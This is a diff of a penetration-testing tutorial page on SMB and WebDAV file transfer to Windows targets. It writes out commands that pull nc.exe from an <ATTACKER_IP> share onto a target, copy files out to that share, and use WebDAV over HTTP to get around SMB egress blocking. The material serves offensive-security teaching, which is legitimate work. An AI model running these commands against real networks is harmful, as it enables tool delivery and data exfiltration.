@@ -6,12 +6,12 @@ tags: [File Transfer, SMB]
 weight: 2
 ---
 
-SMB is very ubiquitous in Windows-based internal network environments like an Active Directory network. As such, it also provides opportunities for attackers to exfiltrate files in and out of the network.
+SMB is ubiquitous in Windows-based internal network environments like an Active Directory network. As such, it also provides opportunities for attackers to transfer files into the network or exfiltrate them from it.
 
-In this article, we will primarily discuss file download and upload methods for Windows targets. SMB file transfer on Linux targets can be achieved with `smbclient` if one is installed on the target machine.
+In this article, we will primarily discuss file download and upload methods for Windows targets. SMB file transfer on Linux targets can be achieved with `smbclient` if it is installed on the target machine.
 
 ## SMB Server Setup
-If we want to host an SMB server on the Linux attacker machine, we can use Impacket `smbserver.py`. Note that elevated privilege is needed to bind to port numbers less than 1024.
+If we want to host an SMB server on the Linux attacker machine, we can use Impacket's `smbserver.py`. Note that elevated privileges are needed to bind to port numbers less than 1024.
 ```bash
 sudo smbserver.py share -smb2support /tmp/smbshare
 ```
@@ -26,12 +26,12 @@ C:\> copy \\<ATTACKER_IP>\share\nc.exe
         1 file(s) copied.
 ```
 
-Note that newer versions of Windows block unauthenticated SMB access by default. We can work around it by setting a username and password with our SMB server:
+Many modern Windows versions and editions block insecure guest SMB access by default. We can use authenticated access by setting a username and password with our SMB server; SMB signing requirements and other client policies must also be satisfied:
 ```bash
 sudo smbserver.py share -smb2support /tmp/smbshare -user <USERNAME> -password <PASSWORD>
 ```
 
-We now have to mount our share with `net use` before being able to transfer files.
+We can establish an authenticated connection and map our share with `net use` before transferring files.
 ```shell-session
 C:\> net use n: \\<ATTACKER_IP>\share /user:<USERNAME> <PASSWORD>
 
@@ -42,7 +42,7 @@ C:\> copy n:\nc.exe
 ```
 
 ### SMB File Upload
-Similarly, file upload from target to attacker machine can be done using the `copy` command.
+Similarly, file upload from the target to the attacker machine can be done using the `copy` command.
 ```shell-session
 C:\> net use n: \\<ATTACKER_IP>\share /user:<USERNAME> <PASSWORD>
 
@@ -62,14 +62,14 @@ C:\> dir n:\
 ```
 
 ## WebDAV File Transfer
-Many organizations may flag SMB traffic out of their internal network as suspicious or block them altogether. We can circumvent these retrictions using WebDAV, which is an extension of HTTP that enables a web server to behave like an SMB file server. This allows our SMB traffic to blend in with normal HTTP traffic, which is unlikely to get blocked in all but air-gapped networks.
+Many organizations may flag SMB traffic out of their internal network as suspicious or block it altogether. WebDAV is an extension of HTTP for accessing and managing remote files. Windows can expose a WebDAV share through a UNC path or mapped drive, but the transfer uses HTTP(s), not SMB tunneled over HTTP. It may work where outbound SMB is blocked, but HTTP(s) egress controls and proxy policies can still block it.
 
-To set up a WebDAV server on our Linux Attacker machine, we need two Python modules: `wsgidav` and `cheroot`. Below is the `wsgidav` command to setup a WebDAV share:
+To set up a WebDAV server on our Linux attacker machine, we need two Python modules: `wsgidav` and `cheroot`. Below is the `wsgidav` command to set up a WebDAV share with anonymous read-write access:
 ```bash
 sudo wsgidav --host=0.0.0.0 --port=80 --root=<SHARE_PATH> --auth=anonymous
 ```
 
-On our Windows host, we can connect to the WebDAV share by specifying the `DavWWWRoot` directory, which will allow us to access files in the root directory.
+On our Windows host, the WebDAV redirector must be installed and the WebClient service running. We can connect to the WebDAV share by specifying `DavWWWRoot`, a special UNC path component that refers to the server root rather than a physical directory.
 ```shell-session
 C:\> dir \\<ATTACKER_IP>\DavWWWRoot
  Volume in drive \\<ATTACKER_IP>\DavWWWRoot has no label.
